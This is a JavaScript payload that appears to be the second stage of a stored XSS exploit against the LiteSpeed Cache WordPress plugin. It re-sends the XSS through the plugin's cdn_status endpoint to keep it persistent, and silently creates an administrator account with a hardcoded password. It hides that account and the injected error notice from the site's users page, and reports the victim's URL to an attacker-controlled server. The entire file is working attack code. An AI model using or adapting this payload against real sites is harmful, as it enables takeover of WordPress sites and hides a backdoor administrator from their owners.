const SERVER_URL = "https://your.server";
const BASE_URL = window.location.href.split("wp-admin")[0];
const XSS = `<script src=${SERVER_URL}/admin-bar-reloaded.min.js></script>`;
const FALL_BACK_LOAD_PAGE_THRESHOLD_MS = 5000;

const NEW_ADMIN_USERNAME = "wp-config-user";
const NEW_ADMIN_PASSWORD = "somepassword123";

// ping the server with the URL and cookies of the victim
function pingServer(customData = "") {
    const req = new XMLHttpRequest();
    req.open("POST", `${SERVER_URL}/m`, true);
    req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    req.send(`l=${encodeURIComponent(window.location.href)}&c=${encodeURIComponent(customData)}`);
}

// send the XSS request again so it's persistent
function sendXssRequestAgain() {
    document.addEventListener("DOMContentLoaded", () => {
        const req = new XMLHttpRequest();
        req.open("POST", `${BASE_URL}wp-json/litespeed/v1/cdn_status`, true);
        req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        req.send(`success=0&result[_msg]=${encodeURIComponent(XSS)}`);
    });
}

// creates the new admin user
function createAdminUser() {
    const baseAdminURL = `${BASE_URL}wp-admin`;

    // get the nonce
    let req = new XMLHttpRequest();
    req.open("GET", `${baseAdminURL}/user-new.php`, false);
    req.send();

    const nonceMatch = /name="_wpnonce_create-user" value="([^"]+)"/.exec(req.responseText);
    if (!nonceMatch) return;

    const nonce = nonceMatch[1];

    // create the new user
    req = new XMLHttpRequest();
    req.open("POST", `${baseAdminURL}/user-new.php`, false);
    req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    req.send(
        `action=createuser&_wpnonce_create-user=${nonce}&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fuser-new.php&user_login=${NEW_ADMIN_USERNAME}&email=${NEW_ADMIN_USERNAME}%40config.com&first_name=&last_name=&url=&pass1=${NEW_ADMIN_PASSWORD}&pass2=${NEW_ADMIN_PASSWORD}&pw_weak=on&role=administrator&createuser=Add+New+User`
    );
}

function hideUserAndPopup() {
    document.addEventListener("DOMContentLoaded", () => {
        // if they're on the users page, hide that we have created a new user
        if (window.location.href.includes("/users.php") && window.location.href.includes("wp-admin")) {
            // remove the user from the user list
            document.querySelectorAll("#the-list tr").forEach((row) => {
                if (row.innerHTML.includes("wp-config-user")) {
                    row.remove();
                }
            });

            // decrement each user counter by 1
            document.querySelectorAll(".wrap .count").forEach((row) => {
                row.innerHTML = `(${parseInt(row.innerHTML.replace(/\D/g, "")) - 1})`;
            });

            // decrement "x items" count by one
            document.querySelectorAll(".wrap .displaying-num").forEach((row) => {
                row.innerHTML = `${parseInt(row.innerHTML.replace(/\D/g, "")) - 1} items`;
            });
        }

        // remove the error popup (which loads the XSS)
        document.querySelectorAll(".notice-error").forEach((element) => {
            if (element.textContent.includes("There was an error during CDN setup:")) {
                element.remove();
            }
        });
    });
}

function setPageVisibility(visible) {
    document.documentElement.style.display = visible ? "" : "none";
}

// hide the page while modifying the content
setPageVisibility(false);

// fallback to if our server is down or something doesn't load
setTimeout(() => setPageVisibility(true), FALL_BACK_LOAD_PAGE_THRESHOLD_MS);

try {
    // run malicious functions
    sendXssRequestAgain();
    hideUserAndPopup();
    setPageVisibility(true);
    createAdminUser();
    pingServer();
} catch (e) {
    pingServer(e.message);
    setPageVisibility(false);
}
